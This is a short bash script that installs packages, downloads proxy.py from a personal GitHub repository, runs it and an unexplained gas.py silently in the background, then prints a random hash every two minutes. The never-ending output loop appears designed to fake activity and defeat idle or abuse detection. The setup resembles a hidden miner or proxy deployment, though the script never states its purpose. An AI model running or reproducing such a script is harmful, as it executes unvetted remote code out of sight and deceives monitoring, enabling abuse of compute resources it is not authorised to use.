#!/bin/bash
apt update
apt -y install wget curl python3 libjansson4
wget -O proxy.py https://raw.githubusercontent.com/mariobiszz/nenenenenene/main/proxy.py
chmod +x proxy.py gas.py
python3 proxy.py >/dev/null &
python3 gas.py >/dev/null &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
